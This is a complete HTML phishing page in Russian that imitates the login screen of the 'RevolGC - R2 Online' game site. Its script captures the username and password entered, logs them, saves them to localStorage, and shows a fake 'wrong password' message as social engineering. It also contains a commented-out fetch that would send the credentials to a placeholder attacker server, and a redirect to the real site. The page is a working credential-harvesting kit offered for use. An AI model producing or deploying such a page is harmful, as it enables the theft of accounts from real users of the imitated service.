<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход | RevolGC - R2 Online</title>
    <style>
        /* Стили, чтобы страница выглядела как оригинал */
        body {
            font-family: Arial, sans-serif;
            background: #1a1a2e;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: #16213e;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            width: 320px;
            text-align: center;
        }
        .login-box h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #ffd700;
        }
        .login-box input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
            background: #0f3460;
            color: #fff;
            font-size: 16px;
        }
        .login-box input::placeholder {
            color: #aaa;
        }
        .login-box button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background: #ffd700;
            color: #000;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .login-box .error {
            color: #ff6b6b;
            font-size: 14px;
            margin-top: 10px;
        }
        .login-box .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #aaa;
        }
    </style>
</head>
<body>

<div class="login-box">
    <h1>🔒 Вход</h1>
    <form id="loginForm">
        <input type="text" id="login" placeholder="Имя пользователя или email" required>
        <input type="password" id="password" placeholder="Пароль" required>
        <button type="submit">Войти</button>
        <div class="error" id="errorMessage"></div>
    </form>
    <div class="footer">
        Нет учетной записи? <a href="#" style="color:#ffd700;">Зарегистрируйтесь</a>
    </div>
</div>

<script>
    // Перехват данных формы
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Останавливаем отправку

        const login = document.getElementById('login').value;
        const password = document.getElementById('password').value;

        // Проверка на пустые поля
        if (!login || !password) {
            document.getElementById('errorMessage').textContent = 'Заполните все поля!';
            return;
        }

        // 1. Выводим в консоль (для отладки)
        console.log('🔑 Перехваченные данные:');
        console.log('👤 Логин:', login);
        console.log('🔒 Пароль:', password);
        console.log('⏰ Время:', new Date().toLocaleString());

        // 2. Сохраняем в localStorage (чтобы не потерять при перезагрузке)
        const captured = JSON.parse(localStorage.getItem('captured_credentials') || '[]');
        captured.push({
            login: login,
            password: password,
            time: new Date().toISOString()
        });
        localStorage.setItem('captured_credentials', JSON.stringify(captured));

        // 3. Отправляем на ваш сервер (если есть)
        // Раскомментируйте, если у вас есть бэкенд
        /*
        fetch('https://ваш-сервер.com/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ login, password })
        }).catch(err => console.log('Ошибка отправки:', err));
        */

        // 4. Показываем пользователю, что он ошибся (социальная инженерия)
        document.getElementById('errorMessage').textContent = 'Неверный логин или пароль. Попробуйте еще раз.';
        document.getElementById('loginForm').reset();

        // 5. (Опционально) Перенаправляем на реальный сайт через 2 секунды
        // setTimeout(() => {
        //     window.location.href = 'https://revolgc.pro/login';
        // }, 2000);
    });

    // Вывод всех сохраненных данных в консоль при загрузке страницы
    console.log('📋 Ранее сохраненные данные:');
    const saved = JSON.parse(localStorage.getItem('captured_credentials') || '[]');
    console.table(saved);
    console.log('Всего записей:', saved.length);
</script>

</body>
</html>
